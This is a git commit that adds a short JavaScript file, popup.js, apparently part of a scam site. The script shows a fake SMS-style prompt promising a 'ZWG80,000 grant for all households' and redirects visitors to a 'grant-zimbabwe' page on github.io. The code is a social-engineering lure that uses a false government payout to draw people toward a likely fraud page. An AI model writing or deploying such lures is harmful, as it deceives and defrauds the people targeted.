af58fc3bca70cc4ba40fe68fcc62f7c977b1bab3
offersites <havast1920@gmail.com>
2024-12-07 22:48:07 +0100

    Create popup.js

---
+++ popup.js
@@ -0,0 +1,6 @@
+
+var password = 'GET ZWG80,000'
+password=prompt('SMS: Congratulations get ZWG80,000 grant for all households, Kindly Press OK to get grant   ','GET ZWG80,000');
+if (password != 'GET ZWG80,000') {
+location.href='https://offersites.github.io/grant-zimbabwe';
+}
